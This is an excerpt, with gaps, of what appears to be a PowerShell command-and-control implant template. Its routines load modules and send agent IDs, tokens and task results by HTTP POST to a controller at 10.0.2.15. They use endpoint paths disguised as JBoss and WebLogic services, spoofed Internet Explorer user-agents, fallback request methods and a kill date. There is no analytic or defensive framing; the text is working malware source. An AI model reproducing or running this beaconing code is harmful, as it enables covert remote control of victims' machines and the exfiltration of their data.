...
function load(${module})
      {
            ...
            try{
              ${postParams} = @{{AGENTVAR}=${agent};{DATAVAR}=${modulename}}
                ${req}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:80/jboss-net -Method POST -Body ${postParams}
		${req}=${req}.Content
            }
            catch{
                ${postParams} = "{AGENTVAR}=${agent}&{DATAVAR}=${modulename}"
                ...
                ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
                ${req}=${wc3}.UploadString("http://10.0.2.15:80/jboss-net",${postParams})
                }
...
${wc3} = new-object net.WebClient
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=${wc3}.UploadString("http://10.0.2.15:80/uddiexplorer",${finaldata})
...
${enc}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:80/wsdl -Method POST -Body ${postParams}
${enc}=${enc}.Content
}
 catch{
${postParams}="{AGENTVAR}=${agent}&token=${data}"
      ...
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      ${enc}=${wc3}.UploadString("http://10.0.2.15:80/wsdl",${postParams})
        }
...
${kdate} = [datetime]::ParseExact("28/09/2022","dd/MM/yyyy",$null)
...
${result}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:80/webserviceclient -Method POST -Body ${postParams}
}
 catch{
 ${postParams} = "{AGENTVAR}=${agent}&{DATAVAR}=${redata}"
        ${wc3} = new-object net.WebClient
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      ${result}=${wc3}.UploadString("http://10.0.2.15:80/webserviceclient","POST",${postParams})
        }
